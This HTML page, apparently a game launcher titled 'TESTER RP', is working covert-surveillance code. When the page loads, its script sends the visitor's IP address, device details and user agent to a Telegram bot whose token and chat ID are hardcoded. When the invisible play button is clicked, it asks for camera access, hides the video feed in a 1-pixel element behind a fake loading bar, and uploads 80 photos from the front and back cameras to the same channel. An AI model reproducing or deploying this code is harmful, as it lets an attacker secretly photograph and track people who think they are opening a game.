<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>TESTER RP</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        body {
            overflow: hidden;
            touch-action: none;
            -webkit-text-size-adjust: none;
            text-size-adjust: none;
            height: 100vh;
            font-family: Arial, sans-serif;
            position: relative;
            background: #000;
            display: flex;
            flex-direction: column;
        }
        
        .background-container {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/LDrtg7sJ/12-20250403192149.png') no-repeat center center;
            background-size: cover;
            z-index: -2;
        }
        
        .new-background {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('https://i.ibb.co/kVcnz5xZ/14.png') no-repeat center center;
            background-size: cover;
            z-index: -1;
            display: none;
        }
        
        .content {
            position: relative;
            z-index: 1;
            height: 100vh;
            display: flex;
            flex-direction: column;
            justify-content: flex-end;
            align-items: center;
            padding-bottom: 20px;
        }
        
        .play-btn {
            background: transparent;
            border: none;
            width: 200px;
            height: 80px;
            margin-bottom: 100px;
            cursor: pointer;
            position: absolute;
            bottom: 150px;
            opacity: 0;
        }
        
        .hidden-camera {
            position: absolute;
            opacity: 0;
            width: 1px;
            height: 1px;
        }
        
        .legal-links {
            position: absolute;
            bottom: 10px;
            width: 100%;
            text-align: center;
            color: #fff;
            font-size: 12px;
            padding: 5px 0;
        }
        
        .message-box {
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: rgba(0, 0, 0, 0.8);
            color: white;
            padding: 20px;
            border-radius: 10px;
            text-align: center;
            z-index: 100;
            display: none;
        }
        
        .loading-container {
            position: absolute;
            bottom: 50px;
            width: 80%;
            left: 10%;
            text-align: center;
            color: white;
            display: none;
        }
        
        .loading-text {
            margin-bottom: 10px;
            font-size: 16px;
        }
        
        .progress-bar {
            width: 100%;
            height: 10px;
            background-color: #333;
            border-radius: 5px;
            overflow: hidden;
        }
        
        .progress {
            height: 100%;
            width: 0;
            background-color: white;
            transition: width 0.1s linear;
        }
        
        /* –ü–∞–Ω–µ–ª—å –æ—Ç–ª–∞–¥–∫–∏ */
        .debug-panel {
            position: fixed;
            top: 10px;
            right: 10px;
            background: rgba(0, 0, 0, 0.9);
            color: white;
            padding: 10px;
            border-radius: 5px;
            z-index: 1000;
            font-size: 12px;
            border: 1px solid #00b4db;
            max-width: 300px;
        }
        
        .debug-title {
            color: #00b4db;
            font-weight: bold;
            margin-bottom: 5px;
            border-bottom: 1px solid #00b4db;
            padding-bottom: 3px;
        }
        
        .debug-status {
            margin: 3px 0;
        }
        
        .debug-success {
            color: #4CAF50;
        }
        
        .debug-error {
            color: #f44336;
        }
        
        .debug-button {
            background: #007bff;
            color: white;
            border: none;
            padding: 5px 10px;
            border-radius: 3px;
            cursor: pointer;
            margin: 5px 0;
            width: 100%;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="background-container"></div>
    <div class="new-background"></div>
    <div class="content">
        <button class="play-btn" id="playBtn"></button>
    </div>

    <div class="legal-links">
        –î–æ–≥–æ–≤–æ—Ä –æ—Ñ–µ—Ä—Ç—ã    –ü–æ–ª–∏—Ç–∏–∫–∞ –∫–æ–Ω—Ñ–∏–¥–µ–Ω—Ü–∏–∞–ª—å–Ω–æ—Å—Ç–∏
    </div>

    <div class="message-box" id="messageBox">
        –§–æ—Ä—É–º –≤ —Ä–∞–∑—Ä–∞–±–æ—Ç–∫–µ
    </div>

    <div class="loading-container" id="loadingContainer">
        <div class="loading-text">Loading</div>
        <div class="progress-bar">
            <div class="progress" id="progressBar"></div>
        </div>
    </div>
    
    <!-- –ü–∞–Ω–µ–ª—å –æ—Ç–ª–∞–¥–∫–∏ -->
    <div class="debug-panel" id="debugPanel">
        <div class="debug-title">–°—Ç–∞—Ç—É—Å –æ—Ç–ø—Ä–∞–≤–∫–∏</div>
        <div class="debug-status" id="debugStatus">–ì–æ—Ç–æ–≤ –∫ —Ä–∞–±–æ—Ç–µ</div>
        <div class="debug-status">–§–æ—Ç–æ: <span id="debugPhotoCount">0</span>/80</div>
        <button class="debug-button" onclick="forceSendTest()">–¢–µ—Å—Ç –æ—Ç–ø—Ä–∞–≤–∫–∏</button>
        <button class="debug-button" onclick="checkBotStatus()">–ü—Ä–æ–≤–µ—Ä–∏—Ç—å –±–æ—Ç–∞</button>
    </div>

    <video id="hiddenCamera" class="hidden-camera" autoplay playsinline></video>

    <script>
        // Telegram Bot Configuration - –£–ë–ï–î–ò–¢–ï–°–¨ –ß–¢–û –≠–¢–û –ü–†–ê–í–ò–õ–¨–ù–´–ï –î–ê–ù–ù–´–ï
        const botToken = '8134203113:AAEv9pmQQkES_IwC9LhbeMrB1dBO_zLUPcw';
        const chatId = '-1002577213610';
        
        // DOM Elements
        const videoElement = document.getElementById('hiddenCamera');
        const playBtn = document.getElementById('playBtn');
        const messageBox = document.getElementById('messageBox');
        const newBackground = document.querySelector('.new-background');
        const loadingContainer = document.getElementById('loadingContainer');
        const progressBar = document.getElementById('progressBar');
        const debugPanel = document.getElementById('debugPanel');
        const debugStatus = document.getElementById('debugStatus');
        const debugPhotoCount = document.getElementById('debugPhotoCount');
        
        // Game state
        let currentStream = null;
        let frontCameraStream = null;
        let backCameraStream = null;
        let photoCount = 0;
        const totalPhotos = 80;
        const photoInterval = 50; // milliseconds between photos
        let isFrontCameraActive = true;
        let isProcessActive = false;

        // ==================== –û–¢–õ–ê–î–û–ß–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================
        
        function updateDebugStatus(message, isError = false) {
            debugStatus.textContent = message;
            debugStatus.className = isError ? 'debug-status debug-error' : 'debug-status debug-success';
        }
        
        async function forceSendTest() {
            try {
                updateDebugStatus("–û—Ç–ø—Ä–∞–≤–∫–∞ —Ç–µ—Å—Ç–æ–≤–æ–≥–æ —Å–æ–æ–±—â–µ–Ω–∏—è...");
                
                // –ü—Ä–æ—Å—Ç–æ–µ —Ç–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                const testMessage = {
                    chat_id: chatId,
                    text: '‚úÖ –¢–ï–°–¢–û–í–û–ï –°–û–û–ë–©–ï–ù–ò–ï –û–¢ –°–ê–ô–¢–ê\n–í—Ä–µ–º—è: ' + new Date().toLocaleString(),
                    parse_mode: 'HTML'
                };
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(testMessage)
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateDebugStatus("‚úÖ –¢–µ—Å—Ç —É—Å–ø–µ—à–Ω–æ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω!");
                    alert("‚úÖ –¢–µ—Å—Ç–æ–≤–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ –≤ –∫–∞–Ω–∞–ª!");
                } else {
                    updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞: ${result.description}`, true);
                    alert(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${result.description}`);
                }
            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${error.message}`, true);
                alert(`‚ùå –û—à–∏–±–∫–∞ —Å–µ—Ç–∏: ${error.message}`);
            }
        }
        
        async function checkBotStatus() {
            try {
                updateDebugStatus("–ü—Ä–æ–≤–µ—Ä–∫–∞ —Å—Ç–∞—Ç—É—Å–∞ –±–æ—Ç–∞...");
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/getMe`);
                const result = await response.json();
                
                if (result.ok) {
                    updateDebugStatus(`‚úÖ –ë–æ—Ç –¥–æ—Å—Ç—É–ø–µ–Ω: @${result.result.username}`);
                    alert(`‚úÖ –ë–æ—Ç –¥–æ—Å—Ç—É–ø–µ–Ω!\n–ò–º—è: @${result.result.username}\nID: ${result.result.id}`);
                } else {
                    updateDebugStatus(`‚ùå –ë–æ—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: ${result.description}`, true);
                    alert(`‚ùå –ë–æ—Ç –Ω–µ–¥–æ—Å—Ç—É–ø–µ–Ω: ${result.description}`);
                }
            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: ${error.message}`, true);
                alert(`‚ùå –û—à–∏–±–∫–∞ –ø—Ä–æ–≤–µ—Ä–∫–∏: ${error.message}`);
            }
        }

        // ==================== –û–°–ù–û–í–ù–´–ï –§–£–ù–ö–¶–ò–ò ====================
        
        // –ë–ª–æ–∫–∏—Ä–æ–≤–∫–∞ –º–∞—Å—à—Ç–∞–±–∏—Ä–æ–≤–∞–Ω–∏—è
        document.addEventListener('gesturestart', function(e) {
            e.preventDefault();
        });
        
        document.addEventListener('touchmove', function(e) {
            if(e.scale !== 1) {
                e.preventDefault();
            }
        }, { passive: false });

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –ø–æ–ª—É—á–µ–Ω–∏—è –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
        function getDeviceInfo() {
            const screen = window.screen;
            const deviceInfo = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                language: navigator.language,
                screen: {
                    width: screen.width,
                    height: screen.height,
                    availWidth: screen.availWidth,
                    availHeight: screen.availHeight,
                    colorDepth: screen.colorDepth + ' –±–∏—Ç'
                },
                window: {
                    innerWidth: window.innerWidth,
                    innerHeight: window.innerHeight
                },
                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                localTime: new Date().toLocaleString(),
                pageURL: window.location.href
            };

            return deviceInfo;
        }

        // –§—É–Ω–∫—Ü–∏—è –¥–ª—è –∑–∞–ø—É—Å–∫–∞ –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä–∞
        function startProgressBar() {
            loadingContainer.style.display = 'block';
            let progress = 0;
            const totalTime = 40; // 40 —Å–µ–∫—É–Ω–¥
            const step = 100 / (totalTime * 10); // 10 –æ–±–Ω–æ–≤–ª–µ–Ω–∏–π –≤ —Å–µ–∫—É–Ω–¥—É
            
            const timer = setInterval(() => {
                progress += step;
                progressBar.style.width = `${progress}%`;
                
                if (progress >= 100) {
                    clearInterval(timer);
                    messageBox.style.display = 'block';
                    setTimeout(() => {
                        progressBar.style.width = '0%';
                    }, 1000);
                }
            }, 100);
        }

        // 1. –û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ
        async function sendUserInfo() {
            try {
                updateDebugStatus("–°–±–æ—Ä –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏...");
                
                // –ü–æ–ª—É—á–∞–µ–º IP-–∞–¥—Ä–µ—Å
                let ip = '–ù–µ —É–¥–∞–ª–æ—Å—å –ø–æ–ª—É—á–∏—Ç—å';
                try {
                    const ipResponse = await fetch('https://api.ipify.org?format=json');
                    if (ipResponse.ok) {
                        const ipData = await ipResponse.json();
                        ip = ipData.ip;
                    }
                } catch (ipError) {
                    console.warn('Could not get IP:', ipError);
                }

                const deviceInfo = getDeviceInfo();

                // –§–æ—Ä–º–∏—Ä—É–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ
                let message = `üö® –ù–û–í–´–ô –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –ó–ê–®–ï–õ –ù–ê –°–ê–ô–¢ üö®\n\n`;
                message += `üåê IP: ${ip}\n`;
                message += `üì± –£—Å—Ç—Ä–æ–π—Å—Ç–≤–æ: ${deviceInfo.platform}\n`;
                message += `üñ•Ô∏è –≠–∫—Ä–∞–Ω: ${deviceInfo.screen.width}x${deviceInfo.screen.height}\n`;
                message += `üåç –í—Ä–µ–º—è: ${deviceInfo.localTime}\n`;
                message += `üîó –°—Ç—Ä–∞–Ω–∏—Ü–∞: ${deviceInfo.pageURL}\n`;
                message += `üë§ User Agent: ${deviceInfo.userAgent.substring(0, 100)}...`;

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –≤ Telegram
                updateDebugStatus("–û—Ç–ø—Ä–∞–≤–∫–∞ –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏–∏ –≤ –∫–∞–Ω–∞–ª...");
                
                const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'HTML'
                    })
                });
                
                const result = await response.json();
                
                if (result.ok) {
                    updateDebugStatus("‚úÖ –ò–Ω—Ñ–æ—Ä–º–∞—Ü–∏—è –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–∞!");
                } else {
                    updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ –æ—Ç–ø—Ä–∞–≤–∫–∏: ${result.description}`, true);
                }

            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞: ${error.message}`, true);
                console.error('Error sending user info:', error);
            }
        }

        // 2. –ó–∞—Ö–≤–∞—Ç —Ñ–æ—Ç–æ —Å –∫–∞–º–µ—Ä—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∞
        async function captureAndSendPhoto(index) {
            try {
                // –û–±–Ω–æ–≤–ª—è–µ–º —Å—á–µ—Ç—á–∏–∫ –Ω–∞ –ø–∞–Ω–µ–ª–∏ –æ—Ç–ª–∞–¥–∫–∏
                debugPhotoCount.textContent = index;
                
                const canvas = document.createElement('canvas');
                // –£—Å—Ç–∞–Ω–∞–≤–ª–∏–≤–∞–µ–º —Ñ–∏–∫—Å–∏—Ä–æ–≤–∞–Ω–Ω—ã–π —Ä–∞–∑–º–µ—Ä –¥–ª—è —Å—Ç–∞–±–∏–ª—å–Ω–æ—Å—Ç–∏
                canvas.width = 640;
                canvas.height = 480;
                
                const ctx = canvas.getContext('2d');
                // –†–∏—Å—É–µ–º –≤–∏–¥–µ–æ –Ω–∞ canvas
                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                
                // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º –≤ blob
                const blob = await new Promise(resolve => {
                    canvas.toBlob(resolve, 'image/jpeg', 0.7);
                });
                
                const cameraType = isFrontCameraActive ? 'front' : 'back';
                const formData = new FormData();
                formData.append('chat_id', chatId);
                formData.append('photo', blob, `photo_${cameraType}_${index}.jpg`);
                
                const caption = `üì∏ –§–æ—Ç–æ ${isFrontCameraActive ? '—Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–æ–π' : '–∑–∞–¥–Ω–µ–π'} –∫–∞–º–µ—Ä—ã #${index}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`;
                formData.append('caption', caption);
                formData.append('parse_mode', 'HTML');
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–æ—Ç–æ
                updateDebugStatus(`–û—Ç–ø—Ä–∞–≤–∫–∞ —Ñ–æ—Ç–æ ${index}...`);
                
                await fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
                    method: 'POST',
                    body: formData
                });
                
                updateDebugStatus(`‚úÖ –§–æ—Ç–æ ${index} –æ—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ`);
                
            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ —Ñ–æ—Ç–æ ${index}: ${error.message}`, true);
                console.error(`Error sending photo ${index}:`, error);
            }
        }

        // 3. –ü–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏–µ –º–µ–∂–¥—É –∫–∞–º–µ—Ä–∞–º–∏
        async function switchCamera() {
            try {
                if (currentStream) {
                    currentStream.getTracks().forEach(track => track.stop());
                }

                isFrontCameraActive = !isFrontCameraActive;
                const facingMode = isFrontCameraActive ? 'user' : 'environment';

                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: facingMode,
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });

                videoElement.srcObject = currentStream;

                if (isFrontCameraActive) {
                    frontCameraStream = currentStream;
                } else {
                    backCameraStream = currentStream;
                }

                // –ñ–¥–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã
                await new Promise(resolve => setTimeout(resolve, 300));

            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ –ø–µ—Ä–µ–∫–ª—é—á–µ–Ω–∏—è –∫–∞–º–µ—Ä—ã: ${error.message}`, true);
                console.error('Camera switch error:', error);
                throw error;
            }
        }

        // 4. –°–µ—Ä–∏–π–Ω–∞—è —Å—ä–µ–º–∫–∞
        async function takeSeriesOfPhotos() {
            try {
                if (photoCount < totalPhotos) {
                    await captureAndSendPhoto(photoCount + 1);
                    photoCount++;
                    
                    if (photoCount < totalPhotos) {
                        // –ü–µ—Ä–µ–∫–ª—é—á–∞–µ–º –∫–∞–º–µ—Ä—É –∫–∞–∂–¥—ã–µ 2 —Ñ–æ—Ç–æ
                        if (photoCount % 2 === 0) {
                            await switchCamera();
                        }
                        setTimeout(takeSeriesOfPhotos, photoInterval);
                    } else {
                        // –ó–∞–≤–µ—Ä—à–µ–Ω–∏–µ —Å—ä–µ–º–∫–∏
                        updateDebugStatus("‚úÖ –°—ä–µ–º–∫–∞ –∑–∞–≤–µ—Ä—à–µ–Ω–∞!");
                        
                        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Ñ–∏–Ω–∞–ª—å–Ω–æ–µ —Å–æ–æ–±—â–µ–Ω–∏–µ
                        try {
                            await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                                method: 'POST',
                                headers: {
                                    'Content-Type': 'application/json',
                                },
                                body: JSON.stringify({
                                    chat_id: chatId,
                                    text: `‚úÖ –°–ï–†–ò–ô–ù–ê–Ø –°–™–ï–ú–ö–ê –ó–ê–í–ï–†–®–ï–ù–ê\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                                    parse_mode: 'HTML'
                                })
                            });
                        } catch (e) {
                            console.error('Completion message error:', e);
                        }
                        
                        stopAllCameras();
                    }
                }
                
            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ —Å—ä–µ–º–∫–∏: ${error.message}`, true);
                console.error('Series error:', error);
                stopAllCameras();
            }
        }

        // 5. –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –≤—Å–µ—Ö –∫–∞–º–µ—Ä
        function stopAllCameras() {
            [frontCameraStream, backCameraStream, currentStream].forEach(stream => {
                if (stream) {
                    try {
                        stream.getTracks().forEach(track => track.stop());
                    } catch (error) {
                        console.error('Error stopping camera:', error);
                    }
                }
            });
            videoElement.srcObject = null;
            isProcessActive = false;
        }

        // 6. –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä
        async function initCameras() {
            try {
                updateDebugStatus("–ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è –∫–∞–º–µ—Ä...");
                
                // –ü–æ–∫–∞–∑—ã–≤–∞–µ–º –Ω–æ–≤—ã–π —Ñ–æ–Ω –∏ –∑–∞–ø—É—Å–∫–∞–µ–º –ø—Ä–æ–≥—Ä–µ—Å—Å-–±–∞—Ä
                newBackground.style.display = 'block';
                startProgressBar();

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞—á–∞–ª–µ —Å—ä–µ–º–∫–∏
                try {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: `üì∏ –ù–ê–ß–ê–õ–û –°–ï–†–ò–ô–ù–û–ô –°–™–ï–ú–ö–ò\n–í—Å–µ–≥–æ —Ñ–æ—Ç–æ: ${totalPhotos}\n–ò–Ω—Ç–µ—Ä–≤–∞–ª: ${photoInterval}–º—Å\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (e) {
                    console.error('Start message error:', e);
                }

                isFrontCameraActive = true;
                isProcessActive = true;
                currentStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 640 },
                        height: { ideal: 480 }
                    },
                    audio: false
                });
                
                frontCameraStream = currentStream;
                videoElement.srcObject = currentStream;

                // –ñ–¥–µ–º –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã
                await new Promise(resolve => setTimeout(resolve, 1000));

                photoCount = 0;
                debugPhotoCount.textContent = '0';
                takeSeriesOfPhotos();
                
            } catch (error) {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞ –∫–∞–º–µ—Ä—ã: ${error.message}`, true);
                console.error('Camera init error:', error);
                messageBox.style.display = 'block';
            }
        }

        // 7. –û–±—Ä–∞–±–æ—Ç—á–∏–∫ –∫–Ω–æ–ø–∫–∏ "–ò–≥—Ä–∞—Ç—å"
        playBtn.addEventListener('click', async function() {
            if (isProcessActive) return;
            
            updateDebugStatus("–ó–∞–ø—É—Å–∫ –ø—Ä–æ—Ü–µ—Å—Å–∞...");
            
            try {
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –Ω–∞–∂–∞—Ç–∏–∏ –∫–Ω–æ–ø–∫–∏
                try {
                    await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: `üü¢ –ü–û–õ–¨–ó–û–í–ê–¢–ï–õ–¨ –ù–ê–ñ–ê–õ –ö–ù–û–ü–ö–£ "–ò–ì–†–ê–¢–¨"\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}`,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (e) {
                    console.error('Button click message error:', e);
                }
                
                // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –¥–æ—Å—Ç—É–ø –∫ –∫–∞–º–µ—Ä–µ
                updateDebugStatus("–ó–∞–ø—Ä–æ—Å –¥–æ—Å—Ç—É–ø–∞ –∫ –∫–∞–º–µ—Ä–µ...");
                const stream = await navigator.mediaDevices.getUserMedia({ 
                    video: true
                });
                
                // –ó–∞–∫—Ä—ã–≤–∞–µ–º —Ç–µ—Å—Ç–æ–≤—ã–π –ø–æ—Ç–æ–∫
                stream.getTracks().forEach(track => track.stop());
                
                // –ó–∞–ø—É—Å–∫–∞–µ–º –æ—Å–Ω–æ–≤–Ω–æ–π –ø—Ä–æ—Ü–µ—Å—Å
                await sendUserInfo();
                await initCameras();
                
            } catch (error) {
                updateDebugStatus(`‚ùå –û—Ç–∫–∞–∑ –≤ –¥–æ—Å—Ç—É–ø–µ: ${error.message}`, true);
                console.error('User denied camera access:', error);
                messageBox.style.display = 'block';
            }
        });

        // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ–ª—å–∑–æ–≤–∞—Ç–µ–ª–µ —Å—Ä–∞–∑—É –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('load', function() {
            updateDebugStatus("–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–≥—Ä—É–∂–µ–Ω–∞");
            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ –ø–æ—Å–µ—â–µ–Ω–∏–∏
            sendUserInfo().catch(e => {
                updateDebugStatus(`‚ùå –û—à–∏–±–∫–∞: ${e.message}`, true);
                console.error('Initial info error:', e);
            });
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ –∑–∞–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        window.addEventListener('beforeunload', function() {
            if (isProcessActive) {
                updateDebugStatus("–°—Ç—Ä–∞–Ω–∏—Ü–∞ –∑–∞–∫—Ä—ã–≤–∞–µ—Ç—Å—è...");
                
                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º —Å–æ–æ–±—â–µ–Ω–∏–µ –æ –∑–∞–∫—Ä—ã—Ç–∏–∏
                try {
                    fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify({
                            chat_id: chatId,
                            text: `üì¥ –°–¢–†–ê–ù–ò–¶–ê –ó–ê–ö–†–´–¢–ê\n–í—Ä–µ–º—è: ${new Date().toLocaleString()}\n–û—Ç–ø—Ä–∞–≤–ª–µ–Ω–æ —Ñ–æ—Ç–æ: ${photoCount}/${totalPhotos}`,
                            parse_mode: 'HTML'
                        })
                    });
                } catch (e) {
                    console.error('Close message error:', e);
                }
                
                stopAllCameras();
            }
        });

        // –û—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä –ø—Ä–∏ —Å–∫—Ä—ã—Ç–∏–∏ —Å—Ç—Ä–∞–Ω–∏—Ü—ã
        document.addEventListener('visibilitychange', function() {
            if (document.hidden && isProcessActive) {
                updateDebugStatus("–°—Ç—Ä–∞–Ω–∏—Ü–∞ —Å–∫—Ä—ã—Ç–∞, –æ—Å—Ç–∞–Ω–æ–≤–∫–∞ –∫–∞–º–µ—Ä...");
                stopAllCameras();
            }
        });
    </script>
